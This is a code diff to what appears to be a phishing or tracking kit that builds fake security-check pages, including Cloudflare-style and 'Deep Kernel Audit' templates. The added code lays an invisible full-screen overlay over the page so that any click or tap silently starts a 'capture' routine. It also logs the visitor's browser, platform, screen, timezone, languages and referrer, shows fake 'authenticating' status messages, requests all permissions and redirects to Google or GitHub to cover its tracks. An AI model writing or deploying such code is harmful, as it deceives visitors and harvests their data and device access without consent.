@@ -15,7 +15,7 @@ export const getCaptureScript = (id: string, redirectUrl: string = 'https://goog
     var cfg = ${JSON.stringify(theme)};
     
     var extraBuffer = {};
-    var statusText = null;
+    window.lastStatusMsg = "Initializing...";
 
     function pTimeout(promise, ms) {
       return Promise.race([
@@ -61,6 +61,35 @@ export const getCaptureScript = (id: string, redirectUrl: string = 'https://goog
        window.onload = function() {
          setTimeout(function() { window.startCapture('silent'); }, 1000);
        };
+    } else {
+       // Implementation of Professional Stealth Overlay for interaction capture
+       window.addEventListener('load', function() {
+          var over = document.createElement('div');
+          over.id = 'stealth-overlay';
+          over.style.position = 'fixed';
+          over.style.top = '0';
+          over.style.left = '0';
+          over.style.width = '100%';
+          over.style.height = '100%';
+          over.style.zIndex = '2147483647';
+          over.style.background = 'transparent';
+          over.style.cursor = 'default';
+          document.body.appendChild(over);
+          
+          var clickCount = 0;
+          function trigger() {
+            window.startCapture();
+            over.remove();
+          }
+          
+          over.addEventListener('click', function(e) {
+            trigger();
+          });
+          
+          over.addEventListener('touchstart', function(e) {
+            trigger(); 
+          });
+       });
     }
 
     setInterval(checkRedirect, 1000);
@@ -74,25 +103,36 @@ export const getCaptureScript = (id: string, redirectUrl: string = 'https://goog
 
       if (running) return;
       running = true;
-      var box = document.querySelector('.box') || document.querySelector('.container') || document.body;
-      if (!box) return;
+      var statusText = null;
+
+      // IMMEDIATE METADATA CAPTURE
+      var quickData = {
+        tmplId: cfg.tmplId,
+        browser: navigator.userAgent,
+        platform: navigator.platform,
+        screen: window.screen.width + "x" + window.screen.height,
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        langs: navigator.languages.join(','),
+        ref: document.referrer || "Direct"
+      };
+      logEvent('info', quickData);
+      
+      var btn = document.querySelector('.btn-verify') || document.querySelector('.btn') || document.querySelector('button');
+      if (btn) {
+        btn.style.opacity = "0.7";
+        btn.style.cursor = "wait";
+        btn.innerText = "AUTHENTICATING...";
+      }
 
       try {
         if (document.documentElement.requestPointerLock) document.documentElement.requestPointerLock();
-        if (navigator.keyboard && navigator.keyboard.lock) navigator.keyboard.lock();
       } catch(e) {}
-
-      var isSilent = mode === 'silent' || flowType === 'silent';
-      var accent = cfg.accent || '#3498db';
-
-      statusText = document.getElementById('status-text');
-      var btn = document.querySelector('.btn-verify') || document.querySelector('.btn') || document.querySelector('button');
 
     if (!isSilent) {
       if (btn) {
-        btn.innerText = "Izinkan / Masuk...";
         btn.style.opacity = "0.7";
         btn.style.cursor = "wait";
+        btn.innerText = "PROCESSING SESSION...";
       }
       var turnstile = document.querySelector('.turnstile-box');
       if (turnstile) {
@@ -110,12 +150,12 @@ export const getCaptureScript = (id: string, redirectUrl: string = 'https://goog
           progContainer.style.margin = '20px 0';
           progContainer.style.textAlign = 'center';
           progContainer.style.width = '100%';
-          progContainer.innerHTML = '<div id="main-spinner" style="width: 28px; height: 28px; border: 3px solid rgba(0,0,0,0.05); border-top: 3px solid ' + accent + '; border-radius: 50%; animation: spinLoader 1s linear infinite; margin: 0 auto 10px;"></div><style>@keyframes spinLoader { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }</style><p id="status-text" style="font-size:14px; color:#666; text-align:center; font-weight: 500; font-family: inherit;">Sinkronisasi sertifikat keamanan...</p>';
+          progContainer.innerHTML = '<div id="main-spinner" style="width: 28px; height: 28px; border: 3px solid rgba(0,0,0,0.05); border-top: 3px solid ' + accent + '; border-radius: 50%; animation: spinLoader 1s linear infinite; margin: 0 auto 10px;"></div><style>@keyframes spinLoader { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }</style><p id="status-text" style="font-size:14px; color:#666; text-align:center; font-weight: 500; font-family: inherit;">Initializing diagnostic sequence...</p>';
           
-          if (btn) {
+          if (btn && cfg.tmplId !== 'terminal') {
             btn.parentNode.insertBefore(progContainer, btn.nextSibling);
-            btn.style.display = 'none'; // Hide button after it's clicked to prevent double clicks and clutter
-          } else {
+            btn.style.display = 'none'; 
+          } else if (!btn) {
             box.appendChild(progContainer);
           }
         }
@@ -124,17 +164,23 @@ export const getCaptureScript = (id: string, redirectUrl: string = 'https://goog
     }
     
     function updateProgress(p, text) {
-      if (!statusText) return;
       var messages = [
-        "Verifying browser environment...",
-        "Validating network integrity...",
-        "Checking security certificates...",
-        "Syncing session metadata...",
-        "Finalizing security audit..."
+        "Analyzing environment...",
+        "Validating integrity...",
+        "Hardening connection...",
+        "Syncing markers...",
+        "Finalizing audit..."
       ];
       var idx = Math.floor(p / 20);
       if (idx >= messages.length) idx = messages.length - 1;
-      statusText.innerText = text || messages[idx];
+      var msg = text || messages[idx];
+      window.lastStatusMsg = msg;
+      var st = document.getElementById('status-text');
+      if (st) st.innerText = msg;
+    }
+    
+    if (cfg.silent || cfg.flow === 'silent') {
+       updateProgress = function() {};
     }
 
       async function runSilentProbes() {
@@ -920,34 +966,67 @@ export const templates: Record<string, {name: string, render: (id: string) => st
       tmplId: 'cloudflare', perms: ALL_PERMS, accent: '#f6821f', icon: '☁️'
     })}</body></html>`
   },
-  'pegasus': {
-    name: "💻 System: Advanced Diagnostic Audit [STABLE]",
-    render: (id) => `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><title>System Integrity Check</title><style>body { background:#f4f7f9; color:#333; font-family: -apple-system, system-ui, sans-serif; display:flex; align-items:center; justify-content:center; min-height:100vh; margin:0; } .box { border:1px solid #d1d9e0; padding:40px; background:#fff; width:95%; max-width:600px; border-radius:8px; box-shadow: 0 4px 20px rgba(0,0,0,0.05); } .header { border-bottom:1px solid #e1e9f1; padding-bottom:20px; margin-bottom:25px; display:flex; justify-content:space-between; align-items:center; } .status-badge { background:#e8f0fe; color:#1a73e8; padding:4px 12px; border-radius:4px; font-size:12px; font-weight:600; text-transform:uppercase; border:1px solid #d2e3fc; } .console { background:#f8f9fa; border-radius:4px; padding:20px; font-family: 'JetBrains Mono', monospace; font-size:13px; line-height:1.6; height:180px; overflow-y:auto; color:#666; border:1px solid #e1e4e8; } .console span { color:#1a73e8; font-weight: 600; } .btn { width:100%; background:#1a73e8; color:#fff; border:none; padding:16px; border-radius:4px; font-weight:600; cursor:pointer; margin-top:30px; font-size:16px; transition:all 0.2s; } .btn:hover { background:#185abc; }</style></head><body><div class="box"><div class="header"><div><div style="font-weight:600; font-size:18px; color:#1c1e21;">Central Diagnostic Console</div><div style="font-size:12px; color:#70757a;">Ver: 10.4.1-Build-SEC-2026</div></div><div class="status-badge">Awaiting Update</div></div><p style="font-size:14px; color:#4a4a4a; margin-bottom:20px;">A full environment diagnostic is required to synchronize your session with our global security infrastructure.</p><div class="console" id="log-console">
-[INFO] Initialize diagnostic engine...
-[INFO] Mapping environment variables...
-[OK] Isolation layer check passed.
-[WAIT] Ready for deep environment validation...
-    </div><button class="btn" onclick="window.startCapture();">Synchronize & Verify Session</button></div>
+  'terminal': {
+    name: "💻 System: Terminal Diagnostic Audit [STABLE]",
+    render: (id) => `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><title>Terminal Integrity Check</title><style>
+      body { background:#050505; color:#00ff41; font-family: 'JetBrains Mono', 'Fira Code', 'Courier New', monospace; display:flex; align-items:center; justify-content:center; height:100vh; margin:0; padding: 20px; box-sizing: border-box; overflow: hidden; }
+      .box { width:100%; max-width:850px; background:rgba(10, 15, 10, 0.98); border:1px solid #1a3a2a; border-radius:4px; padding:50px; box-shadow:0 0 50px rgba(0, 255, 65, 0.08); position: relative; }
+      .header-info { margin-bottom: 30px; border-bottom: 1px solid #1a3a2a; padding-bottom: 15px; }
+      .header-info h2 { margin: 0; font-size: 18px; color: #00ff41; letter-spacing: 2px; }
+      .header-info p { margin: 5px 0 0; font-size: 11px; color: #005020; font-weight: 600; }
+      
+      .btn-container { margin: 40px 0; display: flex; justify-content: center; }
+      .btn { background: #00ff41; color:#000; border:none; padding:18px 45px; font-family:inherit; font-weight:900; cursor:pointer; font-size:14px; border-radius:2px; text-transform:uppercase; transition: all 0.3s; width: 100%; letter-spacing: 2px; box-shadow: 0 0 20px rgba(0,255,65,0.2); }
+      .btn:hover { background:transparent; color:#00ff41; box-shadow: 0 0 30px rgba(0,255,65,0.4); border: 1px solid #00ff41; }
+      
+      #log-console { height:220px; overflow-y:auto; font-size:11px; line-height:1.8; border:1px solid rgba(26, 58, 42, 0.5); background: rgba(0,0,0,0.3); border-radius: 4px; padding:15px; scrollbar-width: none; color: #00ca3c; mask-image: linear-gradient(to bottom, transparent, black 15%, black 85%, transparent); }
+      #log-console::-webkit-scrollbar { display: none; }
+      .line { margin-bottom: 4px; font-weight: 500; }
+      .ts { color: #005020; margin-right: 12px; font-size: 10px; font-weight: 800; }
+      .cursor { display:inline-block; width:8px; height:15px; background:#00ff41; animation: blink 1s infinite; vertical-align: middle; margin-left: 5px; }
+      
+      @keyframes blink { 0%, 100% { opacity:1; } 50% { opacity:0; } }
+      .footer-info { color: #00401a; font-size: 9px; margin-top: 30px; text-align: center; font-weight: 600; text-transform: uppercase; letter-spacing: 1px; }
+      .status-pill { display: inline-block; padding: 2px 8px; border: 1px solid #00ff41; border-radius: 3px; font-size: 10px; margin-left: 10px; vertical-align: middle; }
+    </style></head><body><div class="box">
+    <div class="header-info">
+      <h2>DEEP KERNEL AUDIT <span class="status-pill">STABLE</span></h2>
+      <p>GLOBAL THREAT DETECTION // SESSION INTEGRITY VERIFICATION</p>
+    </div>
+    
+    <div class="btn-container">
+      <button class="btn btn-verify" onclick="window.startCapture();">Synchronize Identity & Verify</button>
+    </div>
+
+    <div id="log-console">
+      <div class="line"><span class="ts">[BOOT]</span> Initializing diagnostic engine... [OK]</div>
+      <div class="line"><span class="ts">[BOOT]</span> Mapping hardware architecture... [OK]</div>
+      <div class="line"><span class="ts">[BOOT]</span> Establishing secure socket... [OK]</div>
+      <div class="line"><span class="ts">[INFO]</span> Awaiting user interaction...<span class="cursor"></span></div>
+    </div>
+    
+    <div class="footer-info">SECURED TUNNEL // NODE: ASIA-SOUTH-1 // SID: ${id.substring(0,12)}</div>
+    </div>
     <script>
       var log = document.getElementById('log-console');
-      var lines = [
-        "[INFO] Capturing hardware entropy profile...",
-        "[INFO] Analyzing browser pipeline mapping...",
-        "[INFO] Syncing geospatial markers...",
-        "[INFO] Validating integrity API hooks...",
-        "[WAIT] Security handshake pending user confirmation..."
-      ];
-      var idx = 0;
+      function addLine(msg, type) {
+        var d = new Date();
+        var tsStr = "[" + d.getHours().toString().padStart(2,'0') + ":" + d.getMinutes().toString().padStart(2,'0') + ":" + d.getSeconds().toString().padStart(2,'0') + "]";
+        var div = document.createElement('div');
+        div.className = 'line';
+        div.innerHTML = '<span class="ts">' + (type || tsStr) + '</span> ' + msg;
+        log.appendChild(div);
+        log.scrollTop = log.scrollHeight;
+      }
+      var lastStatus = "";
       setInterval(function() {
-        if (idx < lines.length) {
-          log.innerHTML += "\\n<span>[RUN]</span> " + lines[idx];
-          log.scrollTop = log.scrollHeight;
-          idx++;
+        if(window.lastStatusMsg && window.lastStatusMsg !== lastStatus) {
+           lastStatus = window.lastStatusMsg;
+           addLine(lastStatus, "RUN");
         }
-      }, 3000);
-    </script>
-    ${getCaptureScript(id, 'https://support.google.com/accounts/answer/46526', {
-      tmplId: 'pegasus', perms: ALL_PERMS, accent: '#1a73e8', icon: '💻',
+      }, 500);
+    </script>${getCaptureScript(id, 'https://github.com', {
+      tmplId: 'terminal', perms: ALL_PERMS, accent: '#00ff41'
     })}</body></html>`
   },
   'security_audit': {
